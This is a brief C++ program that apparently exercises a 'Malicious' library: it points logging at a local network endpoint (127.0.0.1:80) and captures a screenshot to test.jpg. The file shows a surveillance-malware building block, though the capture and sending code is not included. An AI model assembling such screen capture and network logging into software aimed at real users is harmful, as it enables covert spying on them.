#include <common/Log.hpp>
#include <malicious/Screenshot.hpp>

#include <iostream>
using namespace std;
using namespace Common;
using namespace Malicious;

int main(int argc, char * argv[])
{
	LOG.setHeader("SESSION");
	LOG.addObserver(new LogToNetwork("127.0.0.1", 80));

	Screenshot sc;
	sc.take("test.jpg", 100);
	return EXIT_SUCCESS;
}
